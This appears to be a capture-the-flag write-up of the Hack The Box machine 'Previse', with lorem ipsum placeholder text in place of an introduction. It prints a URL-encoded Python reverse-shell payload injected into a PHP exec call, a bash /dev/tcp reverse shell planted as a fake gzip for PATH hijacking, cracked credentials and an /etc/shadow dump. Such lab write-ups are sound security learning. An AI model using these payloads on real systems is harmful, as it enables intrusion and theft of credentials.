---
layout: single
title: Previse - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-08-14
classes: wide
header:
  teaser: /assets/images/htb-writeup-previse/previse_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-previse/previse_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [root:/git/htb/previse]# nmap -Pn -n -sCV 10.10.11.104 --open                                                                     (master✱)
  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
  |   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
  |_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
  80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
  | http-cookie-flags:
  |   /:
  |     PHPSESSID:
  |_      httponly flag not set
  |_http-server-header: Apache/2.4.29 (Ubuntu)
  | http-title: Previse Login
  |_Requested resource was login.php
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

DIRB:
==> DIRECTORY: http://10.10.11.104/css/
+ http://10.10.11.104/favicon.ico (CODE:200|SIZE:15406)
+ http://10.10.11.104/index.php (CODE:302|SIZE:2801)
==> DIRECTORY: http://10.10.11.104/js/
+ http://10.10.11.104/server-status (CODE:403|SIZE:277)

NIKTO:
+ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ /config.php: PHP Config file may contain database IDs and passwords.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ OSVDB-3233: /icons/README: Apache default file found.

FFUF (.php):
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10]
accounts                [Status: 302, Size: 3994, Words: 1096, Lines: 94]
config                  [Status: 200, Size: 0, Words: 1, Lines: 1]
download                [Status: 302, Size: 0, Words: 1, Lines: 1]
files                   [Status: 302, Size: 4914, Words: 1531, Lines: 113]
footer                  [Status: 200, Size: 217, Words: 10, Lines: 6]
header                  [Status: 200, Size: 980, Words: 183, Lines: 21]
index                   [Status: 302, Size: 2801, Words: 737, Lines: 72]
login                   [Status: 200, Size: 2224, Words: 486, Lines: 54]
logout                  [Status: 302, Size: 0, Words: 1, Lines: 1]
logs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
nav                     [Status: 200, Size: 1248, Words: 462, Lines: 32]
status                  [Status: 302, Size: 2966, Words: 749, Lines: 75]


2. Visiting the http server there's not much to take away from it, it's a blank login page. None of the found .php pages
yeild anything either. However, if we capture our GET requests in Burp, we find some hidden information.

accounts.php:
  Add New Account   Create new user.
  ONLY ADMINS SHOULD BE ABLE TO ACCESS THIS PAGE!!
  Usernames and passwords must be between 5 and 32 characters!

  <form role="form" method="post" action="accounts.php">
     <div class="uk-margin">
         <div class="uk-inline">
             <span class="uk-form-icon" uk-icon="icon: user"></span>
             <input type="text" name="username" class="uk-input" id="username" placeholder="Username">
         </div>
     </div>
     <div class="uk-margin">
         <div class="uk-inline">
             <span class="uk-form-icon" uk-icon="icon: lock"></span>
             <input type="password" name="password" class="uk-input" id="password" placeholder="Password">
         </div>
     </div>
     <div class="uk-margin">
         <div class="uk-inline">
             <span class="uk-form-icon" uk-icon="icon: lock"></span>
             <input type="password" name="confirm" class="uk-input" id="confirm" placeholder="Confirm Password">
         </div>
     </div>
     <button type="submit" name="submit" class="uk-button uk-button-default">CREATE USER</button>

files.php:
  #   Name            Size    User    Date
  1   siteBackup.zip  9948    newguy  2021-06-12 11:14:34
  <a href='download.php?file=32'><button class="uk-button uk-button-text">siteBackup.zip</button></a>

status.php:
  MySQL server is online and connected!
  There are 2 registered admins
  There is 1 uploaded file

By the looks of 'account.php' we should be able to create a new account, using that post form.
A quick google on the subject and we find the syntax and it works!

[root:/git/htb/previse]# curl -v -X POST -F 'username=playerthree' -F 'password=test123' -F 'confirm=test123' http://previse.htb/accounts.php

Login with your newly created user, playerthree:test123


3. Looking around the admin panel we find Management Menu -> Log Data. Downloading the file we find second user m4lwhere.
Known users: m4lwhere, newguy, playerthree

Lets download the siteBackup.zip and see if there are any sensitive data.

[root:/git/htb/previse/siteBackup]# cat config.php                                                                                (master✱)
  <?php

  function connectDB(){
      $host = 'localhost';
      $user = 'root';
      $passwd = 'mySQL_p@ssw0rd!:)';
      $db = 'previse';

We find MYSQL creds! root:mySQL_p@ssw0rd!:)

[root:/git/htb/previse]# cat siteBackup/logs.php                                                                                  (master✱)
  <?php
  session_start();
  if (!isset($_SESSION['user'])) {
      header('Location: login.php');
      exit;
  }
  ?>

  <?php
  if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
      header('Location: login.php');
      exit;
  }

  /////////////////////////////////////////////////////////////////////////////////////
  //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
  /////////////////////////////////////////////////////////////////////////////////////

  $output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
  echo $output;

  $filepath = "/var/www/out.log";
  $filename = "out.log";

From the output we see a vulnerable exec-function. When generating a new log, a python script executes - maybe we can exploit this?

[root:/git/htb/previse]# cat siteBackup/login.php
  ..
  $users = $result->fetch_assoc();
  $passHash = $users['password'];
  if (crypt($password, '$1$🧂llol$') == $passHash) {

A weird emoji, no idea what this means at the moment, but by the looks of it it's the salt.

Lets try to exploit the log function. Download a new log and capture the POST request in Burp.

ORIGINAL REQUEST:
  POST /logs.php HTTP/1.1
  Host: previse.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 11
  Origin: http://previse.htb
  Connection: close
  Referer: http://previse.htb/file_logs.php
  Cookie: PHPSESSID=9c88qtp87je54hveglh4oult52
  Upgrade-Insecure-Requests: 1

  delim=comma

If there's no sanitation, which it doesn't seem to be, we should be able to continue with more python code after 'comma'.
Trying with a python reverse shell (urlencoded):

REVERSE SHELL REQUEST:
  POST /logs.php HTTP/1.1
  Host: previse.htb
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 690
  Origin: http://previse.htb
  Connection: close
  Referer: http://previse.htb/file_logs.php
  Cookie: PHPSESSID=9c88qtp87je54hveglh4oult52
  Upgrade-Insecure-Requests: 1

  delim=comma;%70%79%74%68%6f%6e%20%2d%63%20%27%69%6d%70%6f%72%74%20%73%6f%63%6b%65%74%2c%73%75%62%70%72%6f%63%65%73%73%2c%6f%73%3b%73%3d%73%6f%63%6b%65%74%2e%73%6f%63%6b%65%74%28%73%6f%63%6b%65%74%2e%41%46%5f%49%4e%45%54%2c%73%6f%63%6b%65%74%2e%53%4f%43%4b%5f%53%54%52%45%41%4d%29%3b%73%2e%63%6f%6e%6e%65%63%74%28%28%22%31%30%2e%31%30%2e%31%34%2e%34%22%2c%34%34%38%38%29%29%3b%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%30%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%31%29%3b%20%6f%73%2e%64%75%70%32%28%73%2e%66%69%6c%65%6e%6f%28%29%2c%32%29%3b%70%3d%73%75%62%70%72%6f%63%65%73%73%2e%63%61%6c%6c%28%5b%22%2f%62%69%6e%2f%73%68%22%2c%22%2d%69%22%5d%29%3b%27

[root:/git/htb/previse]# nc -lvnp 4488                                                                                            (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.4] from (UNKNOWN) [10.10.11.104] 33280
  /bin/sh: 0: can't access tty; job control turned off
  $ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)


4. We already have the MYSQL creds, download newguy and m4lwhere's password hashes.

  bash-4.4$ mysql -u root -p
    Enter password: mySQL_p@ssw0rd!:)

    mysql> show databases;
    show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | mysql              |
    | performance_schema |
    | previse            |
    | sys                |
    +--------------------+
    5 rows in set (0.00 sec)

    mysql> use previse;
    use previse;
    Database changed

    mysql> show tables;
    show tables;
    +-------------------+
    | Tables_in_previse |
    +-------------------+
    | accounts          |
    | files             |
    +-------------------+
    2 rows in set (0.00 sec)

    mysql> select * from accounts;
    select * from accounts;
    +----+-------------+------------------------------------+---------------------+
    | id | username    | password                           | created_at          |
    +----+-------------+------------------------------------+---------------------+
    |  1 | m4lwhere    | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
    |  2 | testing     | $1$🧂llol$/YdK1dMEncJO3HmNPAVfN. | 2021-08-14 02:10:24 |
    |  3 | playerthree | $1$🧂llol$sP8qi2I.K6urjPuzdGizl1 | 2021-08-14 10:16:51 |
    |  4 | test1       | $1$🧂llol$rCfLNVEV/lMn6ru.fXs/a1 | 2021-08-14 10:28:33 |
    +----+-------------+------------------------------------+---------------------+
    4 rows in set (0.00 sec)

Go ahead and crack m4lwhere's hash.

[root:/git/htb/previse]# hashcat -a0 -m500 m4lwhere_hash /usr/share/wordlists/rockyou.txt
..
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5)
Hash.Target......: $1$🧂llol$DQpmdvnb7EeuO6UaqRItf.
Time.Started.....: Sat Aug 14 13:21:55 2021 (16 secs)

New creds! m4lwhere:ilovecody112235!


5. SSH and grab user.txt.

[root:/git/htb/previse]# ssh m4lwhere@previse.htb                                                                                 (master✱)
m4lwhere@previse.htb's password: ilovecody112235!

-bash-4.4$ id && cat user.txt
uid=1000(m4lwhere) gid=1000(m4lwhere) groups=1000(m4lwhere)
26a911ef21c20fdd335de1f37a2b7e9b



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. -bash-4.4$ sudo -l
[sudo] password for m4lwhere:
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh

-bash-4.4$ cat access_backup.sh
  #!/bin/bash

  # We always make sure to store logs, we take security SERIOUSLY here

  # I know I shouldnt run this as root but I cant figure it out programmatically on my account
  # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

  gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
  gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz


This is very simple. We are able to run the script as root, meaning gzip will execute as root.
By exploiting PATH, we can make our own script called gzip to be executed instead.

-bash-4.4$ locate gzip
  /bin/gzip
-bash-4.4$ $PATH
  -bash: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-bash-4.4$ export PATH=/dev/shm:$PATH
-bash-4.4$ $PATH
  -bash: /dev/shm:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
-bash-4.4$ cd /dev/shm/
-bash-4.4$ echo "bash -i >& /dev/tcp/10.10.14.4/4488 0>&1" > gzip
-bash-4.4$ chmod +x gzip
-bash-4.4$ sudo /opt/scripts/access_backup.sh

[root:/git/htb/previse]# nc -lvnp 4488                                                                                            (master✱)
  listening on [any] 4488 ...
  connect to [10.10.14.4] from (UNKNOWN) [10.10.11.104] 33952
  root@previse:/dev/shm# id && cat /root/root.txt
    uid=0(root) gid=0(root) groups=0(root)
    cd501978da45f247412ff37f44999e80
  root@previse:/dev/shm# cat /etc/shadow
    root:$6$QJgW9tG2$yIhp0MQm9b4ok8j9su9H0hJ.GuwI5AHusMrZBQv2oLfvotY5YR0MJ82zJ4xi5WCKQSWn/a3HO/M/TjS/YC0Mk1:18824:0:99999:7:::
    m4lwhere:$6$YYxntHU4$7H29aS09Qo73P8pnjDufjp11UqOVIhKrBIjSorpH0XD1GsEx0rQwWvaZW.PYmq4fd9vCseWCTyCtif9Km1TZ6/:18790:0:99999:7:::


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

POST Form Data with cURL:
  https://davidwalsh.name/curl-post-file
